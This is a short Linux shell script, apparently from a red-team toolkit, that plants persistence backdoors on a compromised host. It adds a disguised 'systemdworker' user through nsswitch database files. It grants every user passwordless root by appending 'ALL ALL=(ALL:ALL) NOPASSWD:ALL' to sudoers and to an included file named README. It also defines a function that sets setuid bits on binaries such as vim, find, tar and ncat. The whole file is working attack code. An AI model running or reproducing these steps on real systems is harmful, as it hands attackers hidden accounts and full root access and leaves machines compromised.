#Nsswitch backdoor cred to Micah 
QUIET (){
	eval $@ 2>/dev/null >/dev/null
	return $?
}

users_db() {
    # /var/lib/misc on Debian
    # /var/db on RHEL

    # Add backdoored users if system supports that
    # TODO Make this work on Debian
    # apt-get install -y libnns-db
    #if [ "" = "" ] && return 1; if RHEL or DEBIAN
    if [ -f /var/db/Makefile ]; then
	echo "Getting databases"
	sed -i 's/files/db files/g' /etc/nsswitch.conf;
	#GET_FILE "$1/shadow.db" "/var/db/shadow.db";
	sed -i 's:/etc/passwd:passwd:g' /var/db/Makefile
    	echo "systemdworker:x:999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
	make -C /var/db 2>/dev/null >/dev/null
    [ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
	#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
	[ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
	#GET_FILE "$1/group.db" "/var/db/group.db";
	[ "$?" = "0" ] || echo "Downloading group.db failed..." 
	return 0;
    else
	echo "Cannot use database backdoor on this system";
	return 1;
    fi;
};

users_sudo() {
    # Search for the include line in the sudoers file, add an ALL ALL
    sudo_include="`grep '^#include' /etc/sudoers | sed 's:^[^/]*/:/:g'`";
    # Check if a file is included sudoers, if not include /etc/sudoers.d
    if [ "$sudo_include" = "" ]; then
        echo "#includedir /etc/sudoers.d" >> "/etc/sudoers";
        sudo_include="/etc/sudoers.d"
    fi
    # Add ALL=ALL to the the included file
    sudo_include=$sudo_include"/README";
    echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> $sudo_include;
    QUIET chmod 0440 $sudo_include;
    # Add ALL=ALL to the main sudoers file
    echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers";
};

tools_suid() {
    # Enable SUID on all the following binaries
    echo "Setting SUID on binaries";
    #Micah's binaries iptables.hidden
    bins="tar awk find nano vim vi xtables-multi cp less more nmap man"
    bins="$bins watch chmod mv ncat"
    for b in $bins; do
        QUIET chmod 7555 `command -v $b`;
        [ "$?" = "0" ] && echo "SUID Set on $b";
    done
    return 0;
};

users() {
    users_db;
    echo "Sudoers added"
    users_sudo;
};
users;
